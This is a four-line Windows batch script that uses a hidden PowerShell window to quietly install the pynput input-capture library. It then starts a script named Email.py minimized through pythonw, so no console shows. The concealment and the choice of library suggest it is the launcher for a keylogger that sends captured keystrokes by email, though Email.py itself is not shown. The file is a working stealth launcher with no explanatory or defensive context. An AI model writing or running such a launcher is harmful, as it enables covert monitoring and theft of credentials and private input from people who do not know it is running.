@echo off
powershell -WindowStyle Hidden -Command "& {Start-Process python -ArgumentList '-m pip install pynput --quiet' -NoNewWindow -Wait}"
start /min pythonw Email.py
exit
